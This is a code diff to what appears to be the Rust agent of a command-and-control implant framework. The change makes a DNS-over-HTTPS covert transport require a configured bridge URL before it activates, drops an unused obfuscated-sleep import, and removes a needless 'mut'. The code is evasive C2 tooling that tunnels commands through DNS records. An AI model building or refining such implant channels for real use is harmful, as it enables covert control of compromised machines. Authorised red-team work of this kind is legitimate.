@@ -25,7 +25,6 @@
 //! with publicly-trusted certificates.  Production deployments should always
 //! use certificate pinning.
 
-use crate::obfuscated_sleep::calculate_jittered_sleep;
 use anyhow::{anyhow, Result};
 use common::tls_transport::{PinnedCertVerifier, TlsTransport};
 use common::{CryptoSession, Message, Transport};
@@ -152,13 +151,24 @@ async fn connect_once(
             Ok(cfg) => {
                 // doh-transport: tunnel C2 messages through DNS TXT records sent
                 // to a public DoH resolver.  Requires a server-side DoH-to-C2
-                // bridge — none is included in this release.
+                // bridge; the bridge URL must be set in `doh_server_url` in the
+                // malleable profile — activating without it would produce a
+                // transport that can never receive commands.
                 #[cfg(feature = "doh-transport")]
                 if cfg.malleable_profile.dns_over_https {
+                    let server_url = cfg
+                        .malleable_profile
+                        .doh_server_url
+                        .as_deref()
+                        .filter(|s| !s.is_empty())
+                        .ok_or_else(|| anyhow!(
+                            "DoH transport requires a compatible server-side DNS-to-C2 bridge \
+                             which is not included. Set doh_server_url in config or disable \
+                             dns_over_https."
+                        ))?;
                     info!(
-                        "doh-transport: dns_over_https=true; switching to DohTransport. \
-                         NOTE: a compatible server-side DoH listener must be deployed; \
-                         none is included in this release."
+                        "doh-transport: dns_over_https=true, server_url={}; switching to DohTransport",
+                        server_url
                     );
                     let session = CryptoSession::from_shared_secret(secret.as_bytes());
                     let transport: Box<dyn Transport + Send> = Box::new(
@@ -223,7 +233,7 @@ async fn connect_once(
     #[cfg(not(feature = "forward-secrecy"))]
     let session = CryptoSession::from_shared_secret(secret.as_bytes());
 
-    let mut transport: Box<dyn Transport + Send> = Box::new(TlsTransport::new(tls_stream, session));
+    let transport: Box<dyn Transport + Send> = Box::new(TlsTransport::new(tls_stream, session));
 
     run_with_heartbeat(transport, agent_id).await
 }
